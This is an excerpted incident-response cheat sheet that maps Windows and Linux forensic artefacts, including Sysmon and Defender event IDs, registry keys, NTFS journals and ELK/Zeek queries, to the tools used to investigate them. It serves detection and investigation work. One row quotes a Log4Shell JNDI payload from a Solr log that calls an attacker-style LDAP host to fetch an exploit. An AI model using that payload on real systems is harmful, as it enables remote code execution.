...
||Sysmon Event ID 1 -> Check for powershell commands with WSMan|Good for tracking lateral movement, WSMan used to configure Windows Remote Management (WinRM) settings on a local computer, specifically, to add a trusted host to the WinRM client configuration.
...
|**What To Look For**|**Where To Find It**|**Investigation Tool**|
|:---:|:---:|:---:|
|File name, path, timestamps, actions (i.e rename, executed (check for .pf files)|`$MFT, $LogFile, $UsnJrnl:$J` ($J can sometimes be found in $Extend directory)|NTFS Log Tracker|
|Timestomping, T1099|`Sysmon` 2 -> For CreationUtcTime (timestompped) and PreviousCreationUtcTime|Event Log Explorer|
...
||11 -> File created or File relocated or File Moved, For ELK use `event.code : 11 and winlog.event_data.Image : *<malicious executable file name> and winlog.event_data.TargetFilename : *` as part of defense evasion effort||
||23 -> File Deleted||
...
||`NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` (Registry keys ending with EA is executable files and 9F is shortcuts. Clicking onto either of those keys will show the user frequency of running various executables/shortcuts, last run time etc. Focus Time values are in milliseconds, this time is determined based on how long the user is active on that process)|Good for finding exact time the user run the malicious file in windows explorer interface|
||`vol.py -f mem.dmp -f pretty windows.registry.userassist.UserAssist > <filename>.txt`|To view the list of files executed and its exact time|
...
|**What To Look For**|**Where To Find It**|**Investigation Tool**|
|:---:|:---:|:---:|
|Client-side Applications|`SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` (full version number of the software can be found here) `SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall` `Software\Microsoft\Windows\CurrentVersion\App Paths`|Registry Explorer/RegRipper|
...
||`System.evtx` look for event id 7045 (A service was installed in the system), to further correlate, you may check in `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>` (for description, ObjectName, DisplayName, ImagePath), attacker may use this for persistence|Event Log Explorer|
...
||`message: "Anonymous TLS connection established"` OR `message: *smtp*` to find related domains and ips|To track connection made to suspicious domain known for malicious email activities and the IP address the domain involved in this connection|
||`"@<domain name>"`|To look for emails, it should show Sender and receiver email and the email title|
||`"@<domain name>" and "Successful login"`|To look for ip address that logged into the email|
||`event.code : 15`|15 -> File create stream hash, able to track for chrome or firefox downloads especially if downloaded via a webmail client or website (winlog.event_data.Contents show the website URL that downloaded the file) and can get file hash|
...
Event id 5001 OR sysmon 13 helps to check the exact time of disabling real-time monitoring.
...
```
PECmd is useful to find out number of runtimes, accurate previous and last run times. Use the PECmd_Output_Timeline to see specifically the accurate number of times the executable was ran during that incident timeframe.
...
|HTTP GET by apache solr call, `HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://192.168.1.10:1389/Exploit}} status=0 QTime=0` where path is the exploited path, foo is the GET request parameter to deliver log4j payload|`log.file.path: /var/solr/logs/solr.log`<br>Note: To use filebeat-* logs|ELK|
...
||`_path == "conn" id.orig_h == <attacker IP address> \| count() by id.resp_p \| sort id` is used to check how many ports the attacker attempted to connect or scan or port scan|
...
||5007 -> Microsoft Defender Antivirus configuration has changed|Good for finding exclusion/excluded paths configured on Windows Defender|
